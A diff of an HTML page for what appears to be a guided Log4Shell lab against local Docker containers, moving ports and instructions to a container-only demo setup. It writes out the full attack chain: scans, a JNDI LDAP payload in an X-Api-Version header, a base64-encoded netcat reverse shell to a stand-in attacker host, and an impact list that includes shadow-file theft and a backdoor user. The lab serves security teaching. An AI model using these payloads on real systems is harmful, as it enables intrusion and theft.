@@ -470,7 +470,7 @@
         </li>
         <li class="step-item locked" data-step="6">
           <span class="step-number">07</span>
-          <div><strong>Manual Reverse Shell</strong><p>Step-by-step shell on the 8080 service.</p></div>
+          <div><strong>Manual Reverse Shell</strong><p>Step-by-step shell on the 8180 service.</p></div>
         </li>
         <li class="step-item locked" data-step="7">
           <span class="step-number">08</span>
@@ -521,7 +521,7 @@
             <li>Use curl to manually fingerprint each service — routes, methods, input shapes, and framework hints.</li>
             <li>Run the recon script to confirm which services trigger a Log4Shell LDAP callback.</li>
             <li>Run the exploit script to demonstrate the RCE attack chain against a confirmed vulnerable service.</li>
-            <li>Perform a manual three-terminal reverse shell attack against the port 8080 reference app.</li>
+            <li>Perform a manual three-terminal reverse shell attack against the port 8180 reference app.</li>
             <li>Read flags from inside the container to prove code execution.</li>
             <li>Locate the Log4j jar on disk — the SBOM artifact that would have prevented all of this.</li>
           </ol>
@@ -544,41 +544,32 @@
 
         <div class="task-card">
           <h3>Run the nmap scan</h3>
-          <pre><code><span class="comment"># Option 1: use the provided script</span>
+          <pre><code><span class="comment"># Option 1: use the provided script in the attacker container</span>
+docker exec -it hafb-demo-rt-log4j-attacker-1 bash
+
 python3 tools/recon/nmap_scan.py
 
 <span class="comment"># Option 2: run nmap directly</span>
-nmap -sV -p- --open &lt;TARGET_IP&gt;
-
-<span class="comment"># Option 3: faster scan of likely high ports</span>
-nmap -sV -p 8000-9000 --open &lt;TARGET_IP&gt;</code></pre>
+<span class="comment"># DEMO-FULL: for the purpose of the demo, feel free to use a shorter nmap scan when testing manually</span>
+nmap -Pn -n -sT -sV -p 8101,8102,8103,8180 --open host.docker.internal</code></pre>
+          <div class="callout">
+            <strong>Demo note:</strong> If you are on the demo, use <code>host.docker.internal</code> instead of a separate target VM IP. The published demo ports are <code>8101</code>, <code>8102</code>, <code>8103</code>, and <code>8180</code>.
+          </div>
         </div>
 
         <div class="task-card">
-          <h3>Record all four open ports you discovered</h3>
-          <p>Enter each port number exactly as nmap reported it. All four must be present to continue.</p>
+          <h3>Common service fingerprint</h3>
+          <p>What service was found running on 3/4 ports on the target machine?</p>
           <div class="port-grid">
             <article class="port-card">
-              <label for="port-1">Open port 1</label>
-              <input id="port-1" type="number" min="1" max="65535" placeholder="Port number">
-            </article>
-            <article class="port-card">
-              <label for="port-2">Open port 2</label>
-              <input id="port-2" type="number" min="1" max="65535" placeholder="Port number">
-            </article>
-            <article class="port-card">
-              <label for="port-3">Open port 3</label>
-              <input id="port-3" type="number" min="1" max="65535" placeholder="Port number">
-            </article>
-            <article class="port-card">
-              <label for="port-4">Open port 4</label>
-              <input id="port-4" type="number" min="1" max="65535" placeholder="Port number">
+              <label for="common-service">Service name</label>
+              <input id="common-service" type="text">
             </article>
           </div>
         </div>
 
         <div class="callout">
-          <strong>Note:</strong> One of the four ports belongs to a standalone reference application used for manual exploitation later in the exercise. Record it here — you will not probe it in the next few steps. That comes at the end.
+          <strong>Note:</strong> One of the four ports (8180) belongs to a standalone reference application used for manual exploitation later in the exercise. Take note of that port and service — you will not probe it in the next few steps. That comes at the end.
         </div>
       </section>
 
@@ -588,58 +579,80 @@ nmap -sV -p 8000-9000 --open &lt;TARGET_IP&gt;</code></pre>
         <p class="eyebrow">Step 3</p>
         <h2>Application Mapping</h2>
         <p>
-          Your nmap scan should have revealed four open ports: <strong>8001, 8002, 8003, and 8080</strong>. In this step you will manually probe the first three to understand what they do, what routes they expose, and whether they look like Java applications. Leave 8080 alone for now — that is the manual exploitation target at the end of the exercise.
+          Your nmap scan should have revealed four open ports: <strong>8101, 8102, 8103, and 8180</strong>. In this step you will manually probe the first three to understand what they do, what routes they expose, and whether they look like Java applications. Leave 8180 alone for now — that is the manual exploitation target at the end of the exercise.
         </p>
-        <p style="margin-top:10px;">Here is what you are working with on ports 8001–8003:</p>
+        <p style="margin-top:10px;">Here is what you are working with on ports 8101–8103:</p>
         <ul class="flat-list" style="margin-top:8px;">
-          <li><strong>Port 8001</strong> — an authentication service. It handles user login.</li>
-          <li><strong>Port 8002</strong> — an inventory search service. It accepts search queries and returns results.</li>
-          <li><strong>Port 8003</strong> — a status service. It is your negative control for this exercise.</li>
+          <li><strong>Port 8101</strong> — an authentication service. It handles user login.</li>
+          <li><strong>Port 8102</strong> — an inventory search service. It accepts search queries and returns results.</li>
+          <li><strong>Port 8103</strong> — a status service. It is your negative control for this exercise.</li>
         </ul>
-        <p style="margin-top:10px; color:var(--muted);">Your job is to probe each one with curl, confirm what routes they expose, and determine whether each looks like a Log4j-capable target.</p>
+        <p style="margin-top:10px;">Your job is to probe each one with curl, confirm what routes they expose, and determine whether each looks like a Log4j-capable target. Follow the steps outlines below and take note of the results of each command. Feel free to dig deeper!</p>
+        <div class="callout">
+          <strong>Demo note:</strong> Because you are on the demo, you use <code>host.docker.internal</code> in place of your target's <code>&lt;TARGET_IP&gt;</code>.
+        </div>
 
         <div class="task-card">
           <h3>Manual discovery commands</h3>
-          <pre><code><span class="comment"># Auth service — port 8001</span>
-curl -i http://&lt;TARGET&gt;:8001/
-curl -i http://&lt;TARGET&gt;:8001/health
-curl -i http://&lt;TARGET&gt;:8001/login
-curl -i -X POST http://&lt;TARGET&gt;:8001/login \
+          <pre><code><span class="comment"># DEMO-FULL equivalents</span>
+docker exec -it hafb-demo-rt-log4j-attacker-1 bash
+
+<span class="comment"># Auth service — port 8101</span>
+curl -i http://host.docker.internal:8101/
+curl -i http://host.docker.internal:8101/health
+curl -i http://host.docker.internal:8101/login
+curl -i -X POST http://host.docker.internal:8101/login \
   -H "Content-Type: application/json" \
   -d '{"username":"test","password":"test"}'
+curl -i http://host.docker.internal:8101/search
+curl -i "http://host.docker.internal:8101/search?q=test"
 
-<span class="comment"># Inventory service — port 8002</span>
-curl -i http://&lt;TARGET&gt;:8002/
-curl -i http://&lt;TARGET&gt;:8002/health
-curl -i http://&lt;TARGET&gt;:8002/search
-curl -i "http://&lt;TARGET&gt;:8002/search?q=test"
+<span class="comment"># Inventory service — port 8102</span>
+curl -i http://host.docker.internal:8102/
+curl -i http://host.docker.internal:8102/health
+curl -i http://host.docker.internal:8102/login
+curl -i -X POST http://host.docker.internal:8102/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"test","password":"test"}'
+curl -i http://host.docker.internal:8102/search
+curl -i "http://host.docker.internal:8102/search?q=test"
 
-<span class="comment"># Status service — port 8003</span>
-curl -i http://&lt;TARGET&gt;:8003/
-curl -i http://&lt;TARGET&gt;:8003/health
-curl -i http://&lt;TARGET&gt;:8003/search
-curl -i "http://&lt;TARGET&gt;:8003/search?q=test"</code></pre>
+<span class="comment"># Status service — port 8103</span>
+curl -i http://host.docker.internal:8103/
+curl -i http://host.docker.internal:8103/health
+curl -i http://host.docker.internal:8103/login
+curl -i -X POST http://host.docker.internal:8103/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"test","password":"test"}'
+curl -i http://host.docker.internal:8103/search
+curl -i "http://host.docker.internal:8103/search?q=test"</code></pre>
+        </div>
+
+        <div class="task-card">
+          <h3>How to interpret the responses</h3>
+          <ul class="flat-list">
+            <li><strong>200 OK</strong> means the route exists and accepted your request.</li>
+            <li><strong>404 Not Found</strong> means that route does not exist on the service.</li>
+            <li><strong>405 Method Not Allowed</strong> means the route exists, but you used the wrong HTTP method. This is a strong clue that the endpoint may expect something like <code>POST</code> instead of <code>GET</code>.</li>
+            <li><strong>Server</strong> headers and response bodies can also reveal framework clues, like Spring Boot or Flask.</li>
+          </ul>
         </div>
 
         <div class="mapping-grid">
           <article class="mapping-card">
-            <h3>Auth service — 8001</h3>
-            <p style="color:var(--muted);font-size:0.9rem;">This is a login service. Try the /login route and look at what it accepts and returns.</p>
-            <label for="svc1-path">Which route accepted your login attempt?</label>
-            <input id="svc1-path" type="text" placeholder="/login">
-            <p class="placeholder-hint">The path after the port number — e.g. /login</p>
-          </article>
+            <h3>Auth service — 8101</h3>
+            <label for="svc1-path">Which route accepted your login attempt? (Format your answer like "/[route]")</label>
+            <input id="svc1-path" type="text">
+                      </article>
 
           <article class="mapping-card">
-            <h3>Inventory service — 8002</h3>
-            <p style="color:var(--muted);font-size:0.9rem;">This is a search service. Try the /search route with a query parameter and observe what it returns.</p>
-            <label for="svc2-path">Which route returned search results?</label>
-            <input id="svc2-path" type="text" placeholder="/search">
-            <p class="placeholder-hint">The path after the port number — e.g. /search</p>
-          </article>
+            <h3>Inventory service — 8102</h3>
+            <label for="svc2-path">Which route returned search results? (Format your answer like "/[route]")</label>
+            <input id="svc2-path" type="text">
+                      </article>
 
           <article class="mapping-card">
-            <h3>Status service — 8003</h3>
+            <h3>Status service — 8103</h3>
             <p style="color:var(--muted);font-size:0.9rem;">This is your negative control. Look carefully at the HTTP response headers — they will tell you what framework this service is built on.</p>
             <label for="svc3-assessment">Does this service look like a Log4j target?</label>
             <select id="svc3-assessment">
@@ -653,7 +666,7 @@ curl -i "http://&lt;TARGET&gt;:8003/search?q=test"</code></pre>
         </div>
       </section>
 
-      <!-- STEP 3: LOG4J PROBING PLAN -->
+      <!-- STEP 4: LOG4J PROBING PLAN -->
       <section class="panel-step" data-step="3">
         <div class="jump-banner" id="jump-3"></div>
         <p class="eyebrow">Step 4</p>
@@ -675,31 +688,36 @@ curl -i "http://&lt;TARGET&gt;:8003/search?q=test"</code></pre>
 
         <div class="task-card">
           <h3>Manual validation commands</h3>
-          <pre><code><span class="comment"># Confirm 8001 accepts a POST login with JSON username field</span>
-curl -i -X POST http://&lt;TARGET&gt;:8001/login \
+          <pre><code><span class="comment"># Confirm 8101 accepts a POST login with JSON username field</span>
+docker exec -it hafb-demo-rt-log4j-attacker-1 bash
+
+curl -i -X POST http://host.docker.internal:8101/login \
   -H "Content-Type: application/json" \
   -d '{"username":"testuser","password":"testpass"}'
 
-<span class="comment"># Confirm 8002 returns results for a search query parameter</span>
-curl -i "http://&lt;TARGET&gt;:8002/search?q=F-35"
+<span class="comment"># Confirm 8102 returns results for a search query parameter</span>
+curl -i "http://host.docker.internal:8102/search?q=F-35"
 
-<span class="comment"># Confirm 8003 responds but is Python-based (negative control)</span>
-curl -i "http://&lt;TARGET&gt;:8003/search?q=test"</code></pre>
+<span class="comment"># Confirm 8103 responds but is Python-based (negative control)</span>
+curl -i "http://host.docker.internal:8103/search?q=test"</code></pre>
+          <div class="callout">
+            <strong>Demo note:</strong> Because you are on the demo, you use <code>host.docker.internal</code> in place of your target's <code>&lt;TARGET_IP&gt;</code>.
+          </div>
         </div>
 
         <div class="task-card">
-          <h3>Why 8003 is the negative control</h3>
+          <h3>Why 8103 is the negative control</h3>
           <p>Service 3 accepts user input and has a search endpoint. A less careful operator might include it in the canary sweep. The correct reasoning is simpler: the service is written in Python. Log4j is a Java library. A Python application cannot be vulnerable to Log4Shell regardless of what input it accepts. The Server header in the HTTP response makes this clear.</p>
         </div>
 
         <div class="task-card">
           <h3>Operator notes</h3>
           <label for="probe-notes">Record your observations and reasoning before running the script.</label>
-          <textarea id="probe-notes" class="xlarge" placeholder="Example: Service on 8001 is a Spring Boot login service. The POST /login endpoint accepts a JSON body with a username field. Login attempts are almost always logged for audit purposes — this is a likely Log4Shell injection point via the username field.
+          <textarea id="probe-notes" class="xlarge" placeholder="Example: Service on 8101 is a Spring Boot login service. The POST /login endpoint accepts a JSON body with a username field. Login attempts are almost always logged for audit purposes — this is a likely Log4Shell injection point via the username field.
 
-Service on 8002 is a Spring Boot inventory search service. The GET /search endpoint accepts a query parameter named q. Search queries are commonly logged for analytics. The q parameter is the injection point.
+Service on 8102 is a Spring Boot inventory search service. The GET /search endpoint accepts a query parameter named q. Search queries are commonly logged for analytics. The q parameter is the injection point.
 
-Service on 8003 shows a Werkzeug/Python Server header. This is a Flask app. Log4j is Java-only. Excluded from the canary sweep."></textarea>
+Service on 8103 shows a Werkzeug/Python Server header. This is a Flask app. Log4j is Java-only. Excluded from the canary sweep."></textarea>
           <p class="placeholder-hint">Be specific — reference field names, routes, and your reasoning for each service.</p>
         </div>
       </section>
@@ -724,20 +742,24 @@ Service on 8003 shows a Werkzeug/Python Server header. This is a Flask app. Log4
 
         <div class="task-card">
           <h3>Run the script</h3>
-          <pre><code><span class="comment"># From inside the attacker container</span>
-python3 tools/exploit/log4shell_recon.py --scan
+          <pre><code>docker exec -it hafb-demo-rt-log4j-attacker-1 bash
 
-<span class="comment"># Or using make</span>
-make recon</code></pre>
-          <p style="margin-top:12px;">When prompted, enter your target IP, your Kali IP, and ports <strong>8001, 8002, and 8003</strong>. Do not include 8080 — that service uses a different injection point (an HTTP header) that the script does not probe automatically.</p>
+<span class="comment"># From inside the attacker container</span>
+python3 tools/exploit/log4shell_recon.py --scan
+</code></pre>
+          <p style="margin-top:12px;">When prompted, enter your target container IP, your attacking container IP, and ports <strong>8101, 8102, and 8103</strong>. Do not include 8180 — that service uses a different injection point (an HTTP header) that the script does not probe automatically.</p>
+        </div>
+
+        <div class="callout">
+          <strong>Demo note:</strong> In DEMO-FULL, use <code>host.docker.internal</code> if the script asks for the target. Use <code>hafb-demo-rt-log4j-attacker-1</code> if you need the attacker callback host. Enter ports <code>8101</code>, <code>8102</code>, and <code>8103</code>, and leave <code>8180</code> for the manual stage.
         </div>
 
         <div class="task-card">
           <h3>Expected results</h3>
           <ul class="flat-list">
-            <li><strong>8001:</strong> VULNERABLE — LDAP callback confirmed via POST /login username field.</li>
-            <li><strong>8002:</strong> VULNERABLE — LDAP callback confirmed via GET /search q parameter.</li>
-            <li><strong>8003:</strong> SAFE — No callback. Python service, no Log4j.</li>
+            <li><strong>8101:</strong> VULNERABLE — LDAP callback confirmed via POST /login username field.</li>
+            <li><strong>8102:</strong> VULNERABLE — LDAP callback confirmed via GET /search q parameter.</li>
+            <li><strong>8103:</strong> SAFE — No callback. Python service, no Log4j.</li>
           </ul>
         </div>
 
@@ -750,7 +772,7 @@ make recon</code></pre>
         <div class="checkpoint">
           <label class="checkbox-row" for="confirmed-log4j">
             <input id="confirmed-log4j" type="checkbox">
-            <span>I have confirmed that services on 8001 and 8002 are vulnerable via LDAP callback, and the service on 8003 is not.</span>
+            <span>I have confirmed that services on 8101 and 8102 are vulnerable via LDAP callback, and the service on 8103 is not.</span>
           </label>
         </div>
       </section>
@@ -779,17 +801,20 @@ make recon</code></pre>
 
         <div class="task-card">
           <h3>Run the exploit script</h3>
-          <pre><code><span class="comment"># From inside the attacker container</span>
-python3 tools/exploit/log4shell_exploit.py
+          <pre><code>docker exec -it hafb-demo-rt-log4j-attacker-1 bash
 
-<span class="comment"># Or using make</span>
-make exploit PORT=8001</code></pre>
-          <p style="margin-top:12px;">When prompted, enter the target IP, your Kali IP, and select port 8001 as the target.</p>
+<span class="comment"># From inside the attacker container</span>
+python3 tools/exploit/log4shell_exploit.py
+</code></pre>
+          <p style="margin-top:12px;">If prompted, enter the target container IP, your attacking container IP, and select port 8101 as the target.</p>
+          <div class="callout">
+            <strong>Demo note:</strong> In DEMO-FULL, use <code>host.docker.internal</code> as the target host and choose port <code>8101</code> or <code>8102</code> based on your recon results.
+          </div>
         </div>
 
         <div class="task-card">
           <label for="exploit-notes">What did you observe in the exploit script output?</label>
-          <textarea id="exploit-notes" class="large" placeholder="Example: The script sent 14 payloads to the auth-service on port 8001. Marshalsec started on port 1389. Each payload was confirmed SENT. The loot file was saved to /app/loot/. The impact summary listed flags read, /etc/shadow stolen, SSH keys hunted, backdoor user added, logs wiped, and service killed."></textarea>
+          <textarea id="exploit-notes" class="large" placeholder="Example: The script sent 14 payloads to the auth-service on port 8101. Marshalsec started on port 1389. Each payload was confirmed SENT. The loot file was saved to /app/loot/. The impact summary listed flags read, /etc/shadow stolen, SSH keys hunted, backdoor user added, logs wiped, and service killed."></textarea>
           <p class="placeholder-hint">Describe what the output showed. Note which payloads were sent and what the impact summary said.</p>
         </div>
       </section>
@@ -798,57 +823,72 @@ make exploit PORT=8001</code></pre>
       <section class="panel-step" data-step="6">
         <div class="jump-banner" id="jump-6"></div>
         <p class="eyebrow">Step 7</p>
-        <h2>Manual Reverse Shell — Port 8080</h2>
+        <h2>Manual Reverse Shell — Port 8180</h2>
         <p>
-          This is the hands-on capstone of the exercise. You will manually exploit the reference vulnerable application on port 8080 to obtain an interactive shell inside the target container. Every command here is typed by you. This is what real exploitation looks like.
+          This is the hands-on capstone of the exercise. You will manually exploit the reference vulnerable application on port 8180 to obtain an interactive shell inside the target container. Every command here is typed by you. This is what real exploitation looks like.
         </p>
 
         <div class="callout">
-          <strong>Why 8080 is different:</strong> The service on port 8080 does not have a login route or a search query parameter. Its injection point is an HTTP request header — <code>X-Api-Version</code>. This is a common API pattern and demonstrates that Log4Shell can fire from any logged input, not just form fields.
+          <strong>Why 8180 is different:</strong> The service on port 8180 does not have a login route or a search query parameter. Its injection point is an HTTP request header — <code>X-Api-Version</code>. This is a common API pattern and demonstrates that Log4Shell can fire from any logged input, not just form fields.
         </div>
 
         <div class="task-card">
           <h3>The three-terminal attack chain</h3>
           <ul class="flat-list">
             <li><strong>Terminal 1 — JNDIExploit:</strong> Acts as both the LDAP server (receives the JNDI lookup) and the HTTP server (serves the malicious Java class). Runs inside the attacker container.</li>
-            <li><strong>Terminal 2 — netcat listener:</strong> Waits for the reverse shell connection from the target container. Runs on your Kali host directly — not inside the container.</li>
-            <li><strong>Terminal 3 — curl trigger:</strong> Sends the HTTP request with the JNDI payload in the header. Runs on your Kali host.</li>
+            <li><strong>Terminal 2 — netcat listener:</strong> Waits for the reverse shell connection from the target container. Runs inside the attacker container.</li>
+            <li><strong>Terminal 3 — curl trigger:</strong> Sends the HTTP request with the JNDI payload in the header. Runs inside the attacker container.</li>
           </ul>
         </div>
 
         <div class="phase-block">
           <h3><span class="phase-badge badge-term1">Terminal 1</span> Start JNDIExploit inside the attacker container</h3>
-          <p>Open a new terminal on your Kali machine and run:</p>
-          <pre><code>docker exec -it attacker java -jar /tools/jndi/JNDIExploit-1.2-SNAPSHOT.jar -i &lt;KALI_IP&gt; -p 8888</code></pre>
-          <p style="margin-top:12px;">Replace <code>&lt;KALI_IP&gt;</code> with your Kali machine's IP address. Wait until you see both lines before moving on:</p>
+          <p>Open a new terminal on your machine and run:</p>
+          <pre><code><span class="comment"># DEMO-FULL equivalent</span>
+docker exec -it hafb-demo-rt-log4j-attacker-1 java -jar /tools/jndi/JNDIExploit-1.2-SNAPSHOT.jar -i &lt;ATTACKER_IP&gt; -p 8888</code></pre>
+          <p style="margin-top:12px;">Replace <code>&lt;ATTACKER_IP&gt;</code> with your attacker's IP address (172.22.0.6). Wait until you see both lines before moving on:</p>
+          <div class="callout">
+            <strong>Demo note:</strong> If you need help finding the IPs of your vulnerable and attacking containers, run the following commands and look for the IP addresses beginning with "172":
+            <ul style="margin-top:10px; margin-bottom:10px;">
+              <li><code>docker inspect hafb-demo-rt-log4j-attacker-1 --format "{{json .NetworkSettings.Networks}}"</code></li>
+              <li><code>docker inspect hafb-demo-log4j-vulnerable-app-1 --format "{{json .NetworkSettings.Networks}}"</code></li>
+            </ul>
+            <strong>Hint:</strong> Attacker container IP: <code>172.22.0.6</code> — Vulnerable app IP: <code>172.22.0.5</code>
+          </div>
           <pre><code>[+] LDAP Server Start Listening on 1389...
 [+] HTTP Server Start Listening on 8888...</code></pre>
           <p style="margin-top:8px; color:var(--muted);">Leave this terminal running. As the exploit fires you will see <code>[+] Received LDAP Query</code>, <code>[+] Send LDAP reference result</code>, and critically <code>[+] Receive ClassRequest</code> when the target JVM fetches and executes the malicious class.</p>
         </div>
 
         <div class="phase-block">
-          <h3><span class="phase-badge badge-term2">Terminal 2</span> Start your netcat listener on Kali host</h3>
-          <p>Open a second terminal on your Kali machine. This is where the reverse shell will appear:</p>
-          <pre><code>nc -lvnp 4444</code></pre>
-          <p style="margin-top:12px; color:var(--muted);">This runs on your <strong>Kali host directly</strong>, not inside the container. The reverse shell from the target container will connect back to your Kali IP on port 4444. Leave it running silently and watch it.</p>
+          <h3><span class="phase-badge badge-term2">Terminal 2</span> Start your netcat listener on attacker host</h3>
+          <p>Open a second terminal on your attacking container. This is where the reverse shell will appear:</p>
+          <pre><code>docker exec -it hafb-demo-rt-log4j-attacker-1 nc -lvnp 4444</code></pre>
+          <p style="margin-top:12px; color:var(--muted);">For the purpose of this demo, this runs inside the container. The reverse shell from the target container will connect back to your attacker container on port 4444. Leave it running silently and watch it.</p>
         </div>
 
         <div class="phase-block">
           <h3><span class="phase-badge badge-term3">Terminal 3</span> Generate the payload and fire</h3>
-          <p>Open a third terminal on your Kali machine. First, generate your base64-encoded reverse shell payload:</p>
+          <p>Open a third terminal on your attacker container. First, generate your base64-encoded reverse shell payload:</p>
           <pre><code><span class="comment"># Generate the netcat reverse shell payload — encode as base64</span>
-echo "nc &lt;KALI_IP&gt; 4444 -e /bin/sh" | base64 -w 0</code></pre>
-          <p style="margin-top:12px;">Replace <code>&lt;KALI_IP&gt;</code> with your Kali IP. Copy the base64 output.</p>
+docker exec -it hafb-demo-rt-log4j-attacker-1 bash
+
+echo "nc &lt;ATTACKER_IP&gt; 4444 -e /bin/sh" | base64 -w 0
+</code></pre>
+          <p style="margin-top:12px;">Replace <code>&lt;ATTACKER_IP&gt;</code> with your attacking container IP. See the DEMO note from the steps in terminal one if you having trouble finding the IP. <strong>Copy the base64 output.</strong></p>
           <p style="margin-top:8px;">We use netcat with <code>-e /bin/sh</code> because it is the most reliable reverse shell method in minimal Java containers. We base64-encode the command because JNDI paths cannot contain spaces or special characters.</p>
           <p style="margin-top:12px;">Now fire the payload. Replace all three placeholders with your actual values:</p>
-          <pre><code><span class="comment"># Replace &lt;TARGET_IP&gt;, &lt;KALI_IP&gt;, and &lt;BASE64&gt; with your values</span>
-curl http://&lt;TARGET_IP&gt;:8080 \
-  -H 'X-Api-Version: ${jndi:ldap://&lt;KALI_IP&gt;:1389/Basic/Command/Base64/&lt;BASE64&gt;}'</code></pre>
+          <pre><code><span class="comment"># Replace &lt;TARGET_IP&gt;, &lt;ATTACKER_IP&gt;, and &lt;BASE64&gt; with your values</span>
+curl http://&lt;TARGET_IP&gt;:8080 -H 'X-Api-Version: ${jndi:ldap://&lt;ATTACKER_IP&gt;:1389/Basic/Command/Base64/&lt;BASE64&gt;}'</code></pre>
           <p style="margin-top:10px; color:var(--muted);">
             <code>&lt;TARGET_IP&gt;</code> — the vulnerable VM's IP address.<br>
-            <code>&lt;KALI_IP&gt;</code> — your Kali machine's IP address.<br>
+            <code>&lt;ATTACKER_IP&gt;</code> — your attacking container's IP address.<br>
             <code>&lt;BASE64&gt;</code> — the output of the echo command above.
           </p>
+        </div>
+
+        <div class="callout">
+          <strong>Demo note:</strong> Internally to the vulnerable machine, the port of the vulnerable service is 8080. Which is why we use that instead of 8180. This is solely for the purpose of a demo env where you are not using 2 different machines (i.e. Kali-Red and Ubuntu-Vulnerable) to perform these labs.
         </div>
 
         <div class="phase-block">
@@ -909,12 +949,12 @@ ip a &amp;&amp; cat /etc/hosts</code></pre>
           <textarea id="sbom-reflection" class="large" placeholder="Example: An SBOM generated at build time would have listed log4j-core 2.14.1 as a dependency. When CVE-2021-44228 was disclosed on December 9, 2021, any organization with an SBOM could have immediately queried it to find all affected services — rather than manually auditing every application over days or weeks while attackers were actively exploiting."></textarea>
           <p class="placeholder-hint">Reference the specific jar version and explain when in the vulnerability lifecycle an SBOM would have changed the outcome.</p>
 
-          <label for="service3-why-safe">Explain in your own words why the service on port 8003 was not vulnerable.</label>
-          <textarea id="service3-why-safe" class="large" placeholder="Example: The service on 8003 is a Python Flask application. Log4j is a Java logging library — it cannot exist in a Python application. Even though the service accepts user input, that input is processed by Python's logging module, not Log4j. The Server header revealed the Python/Werkzeug framework."></textarea>
+          <label for="service3-why-safe">Explain in your own words why the service on port 8103 was not vulnerable.</label>
+          <textarea id="service3-why-safe" class="large" placeholder="Example: The service on 8103 is a Python Flask application. Log4j is a Java logging library — it cannot exist in a Python application. Even though the service accepts user input, that input is processed by Python's logging module, not Log4j. The Server header revealed the Python/Werkzeug framework."></textarea>
           <p class="placeholder-hint">Be specific about why accepting user input alone is not enough to create a Log4Shell vulnerability.</p>
 
-          <label for="injection-comparison">How was the injection point on port 8080 different from 8001 and 8002? Why does this matter?</label>
-          <textarea id="injection-comparison" class="large" placeholder="Example: Services on 8001 and 8002 used form fields and query parameters as injection points. The service on 8080 used an HTTP request header (X-Api-Version). This shows that Log4Shell can fire from any input passed to logger.info(). Headers are often overlooked during security testing because they are not visible in browser forms — an attacker familiar with Log4Shell would test all inputs."></textarea>
+          <label for="injection-comparison">How was the injection point on port 8180 different from 8101 and 8102? Why does this matter?</label>
+          <textarea id="injection-comparison" class="large" placeholder="Example: Services on 8101 and 8102 used form fields and query parameters as injection points. The service on 8180 used an HTTP request header (X-Api-Version). This shows that Log4Shell can fire from any input passed to logger.info(). Headers are often overlooked during security testing because they are not visible in browser forms — an attacker familiar with Log4Shell would test all inputs."></textarea>
           <p class="placeholder-hint">Think about what a defender should test, and what an attacker looks for beyond obvious form fields.</p>
         </div>
 
@@ -950,12 +990,7 @@ ip a &amp;&amp; cat /etc/hosts</code></pre>
     let currentStep = 0;
     let maxStep = 0; // highest step legitimately reached
 
-    const portInputs = [
-      document.getElementById("port-1"),
-      document.getElementById("port-2"),
-      document.getElementById("port-3"),
-      document.getElementById("port-4"),
-    ];
+    const commonServiceInput = document.getElementById("common-service");
 
     const mappingFields = [
       { route: document.getElementById("svc1-path") },
@@ -1027,14 +1062,12 @@ ip a &amp;&amp; cat /etc/hosts</code></pre>
     function validateStep(index) {
       // Step 1: port discovery
       if (index === 1) {
-        const ports = portInputs.map(getValue).filter(Boolean);
-        const required = ["8001", "8002", "8003", "8080"];
-        const missing = required.filter(p => !ports.includes(p));
-        if (ports.length < 4 || missing.length > 0) {
-          showValidationMessage("Not quite — recheck your nmap results. You should find four open application ports.", true);
+        const serviceName = normalize(getValue(commonServiceInput));
+        if (serviceName !== "nagios-nsca") {
+          showValidationMessage("Not quite. Recheck the nmap service fingerprint that appeared on 3/4 open ports.", true);
           return false;
         }
-        showValidationMessage("All four ports identified. Continue to application mapping.");
+        showValidationMessage("Correct service fingerprint. Continue to application mapping.");
       }
 
       // Step 2: application mapping
@@ -1091,7 +1124,7 @@ ip a &amp;&amp; cat /etc/hosts</code></pre>
 
     function renderSummary() {
       const operator = getValue(document.getElementById("operator-name")) || "Anonymous";
-      const ports = portInputs.map(getValue).filter(Boolean).join(", ") || "not recorded";
+      const ports = getValue(commonServiceInput) || "not recorded";
       const svc1 = getValue(mappingFields[0].route) || "not mapped";
       const svc2 = getValue(mappingFields[1].route) || "not mapped";
       const svc3 = getValue(mappingFields[2].assessment) || "not assessed";
@@ -1100,11 +1133,11 @@ ip a &amp;&amp; cat /etc/hosts</code></pre>
       summaryCard.innerHTML = `
         <h3>Operator Summary — ${operator}</h3>
         <ul>
-          <li><strong>Ports discovered:</strong> ${ports}</li>
-          <li><strong>Auth service (8001) route:</strong> ${svc1}</li>
-          <li><strong>Inventory service (8002) route:</strong> ${svc2}</li>
-          <li><strong>Status service (8003) — Log4j target?</strong> ${svc3}</li>
-          <li><strong>Flag recovered from 8080:</strong> ${flag}</li>
+          <li><strong>Common nmap service fingerprint:</strong> ${ports}</li>
+          <li><strong>Auth service (8101) route:</strong> ${svc1}</li>
+          <li><strong>Inventory service (8102) route:</strong> ${svc2}</li>
+          <li><strong>Status service (8103) — Log4j target?</strong> ${svc3}</li>
+          <li><strong>Flag recovered from 8180:</strong> ${flag}</li>
         </ul>
       `;
     }
@@ -1142,3 +1175,5 @@ ip a &amp;&amp; cat /etc/hosts</code></pre>
   </script>
 </body>
 </html>
+
+
